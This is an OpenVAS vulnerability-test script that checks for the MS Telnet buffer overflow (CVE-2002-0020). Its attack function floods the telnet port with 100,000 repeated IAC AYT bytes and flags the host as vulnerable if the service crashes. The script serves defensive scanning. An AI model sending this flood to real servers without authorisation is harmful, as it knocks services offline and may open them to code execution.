###################################################################
# OpenVAS Network Vulnerability Test
# $ID$
#
# MS Telnet Overflow
#
# LSS-NVT-2009-008
#
# Developed by LSS Security Team <http://security.lss.hr>
#
# Copyright (C) 2009 LSS <http://www.lss.hr>
#
# This program is free software; you can redistribute it and/or modify
# it under the terms of the GNU General Public License version 2
# (or any later version), as published by the Free Software Foundation.
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE. See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public
# License along with this program. If not, see
# <http://www.gnu.org/licenses/>.
###################################################################

include("revisions-lib.inc");
tag_summary = "It is possible to crash remote telnet server via malformed protocol options.
This flaw may allow attackers to execute arbitrary code on the system.";

tag_solution = "http://www.microsoft.com/technet/security/bulletin/ms02-004.mspx";

if(description)
{
 script_id(102008);
 script_version("$Revision: 15 $");
 script_tag(name:"last_modification", value:"$Date: 2013-10-27 13:49:54 +0100 (Sun, 27 Oct 2013) $");
 script_tag(name:"creation_date", value:"2009-10-05 19:43:01 +0200 (Mon, 05 Oct 2009)");
 script_tag(name:"cvss_base", value:"7.5");
 script_tag(name:"cvss_base_vector", value:"AV:N/AC:L/Au:N/C:P/I:P/A:P");
 script_tag(name:"risk_factor", value:"High");
 script_bugtraq_id(4061);
 script_cve_id("CVE-2002-0020");

 name = "MS Telnet Overflow";
 script_name(name);

 desc = "
 Summary:
 " + tag_summary + "
 Solution:
 " + tag_solution;
 script_description(desc);

 summary = "Attempts to overflow the Telnet server buffer";
 script_summary(summary);

 script_category(ACT_DESTRUCTIVE_ATTACK);

 script_copyright("Copyright (C) 2009 LSS");
 family = "Buffer overflow";
 script_family(family);
 script_require_ports("Services/telnet", 23);
 if (revcomp(a: OPENVAS_VERSION, b: "6.0+beta5") >= 0) {
   script_tag(name : "solution" , value : tag_solution);
   script_tag(name : "summary" , value : tag_summary);
 }
 exit(0);
}

##ATTACK##
##Vulnerability tested on AYT commands##
function telnet_attack(port){
  iac_ayt = raw_string(0xff, 0xf6);
  bomb_size = 100000;
  sock = open_sock_tcp(port);
  if(sock){
    bomb = crap(data:iac_ayt, length:2*bomb_size);
    send(socket:sock, data:bomb);
    close(sock);
    return(1);
  }else{
    return(0);
  }
}

##MAIN##
port = get_kb_item("Services/telnet");
if(!port) port = 23;

if(telnet_attack(port:port)){
  sock = open_sock_tcp(port);
  if(!sock){
    security_hole(port);
  }else{
    close(sock);
  }
}else exit(-1);

